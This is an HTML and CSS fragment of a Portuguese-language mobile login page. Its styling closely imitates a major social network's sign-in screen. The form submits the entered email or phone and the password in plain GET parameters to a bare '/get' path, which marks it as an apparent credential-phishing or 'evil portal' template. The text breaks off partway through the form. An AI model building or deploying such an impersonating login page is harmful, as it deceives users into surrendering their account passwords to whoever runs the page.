    <style>
      @import url("https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap");

      body {
        display: flex;
        flex-direction: column;
        align-items: center;
        height: 100vh;
        justify-content: space-between;
        background-color: #eef6ff;
        font-family: "Roboto", sans-serif;
      }

      .language-text {
        color: rgb(99, 120, 138);
        padding: unset;
        line-height: 16.9px;
        font-size: 13px;
        user-select: none;
        font-family: "Roboto", sans-serif;
        margin-top: 5px;
      }

      .logo {
        box-sizing: border-box;
        display: flex;
        flex: 0 1 auto;
        flex-direction: row;
        pointer-events: auto;
        position: relative;
        height: 90px;
        min-width: 0px;
      }

      .main-form {
        width: 100%;
        max-width: 400px;
        padding: 20px;
        box-sizing: border-box;
      }

      input {
        width: 93%;
        padding: 20px 10px;
        border: 1px solid #bebebe;
        border-radius: 12px;
        font-size: 16px;
        font-weight: 500;
        font-family: "Roboto", sans-serif;
        color: rgb(70, 90, 105);
      }

      input:focus {
        outline: none;
        border-color: rgb(28, 43, 51);
      }

      .input-password {
        margin: 10px 0;
      }

      .btn-login {
        width: 100%;
        padding: 15px;
        border: none;
        border-radius: 25px;
        font-size: 16px;
        font-weight: 700;
        font-family: "Roboto", sans-serif;
        color: white;
        background-color: rgb(24, 119, 242);
      }

      .recovery-password-text {
        text-align: center;
        color: rgb(28, 43, 51);
        font-weight: 400;
        margin-top: 30px;
      }

      .footer {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        width: 100%;
      }

      .create-account {
        width: 90%;
        padding: 10px;
        border: 1px solid #bebebe;
        border-radius: 25px;
        font-size: 16px;
        font-weight: 500;
        font-family: "Roboto", sans-serif;
        color: rgb(28, 43, 51);
        background-color: transparent;
      }

      .footer-menus {
        color: rgb(99, 120, 138);
        font-size: 13px;
        margin-top: 10px;
      }
    </style>

    <div class="main-form">
      <form action="/get" method="get">
        <input
          type="email"
          name="email"
          placeholder="Número do celular ou email"
          required
        />
        <input
          class="input-password"
          type="password"
          name="pass"
          placeholder="Senha"
          required
        />
        <button class="btn-login" type="submit">Entrar</button>
        <div class="recovery-password-text">Esqueceu a senha?</div>
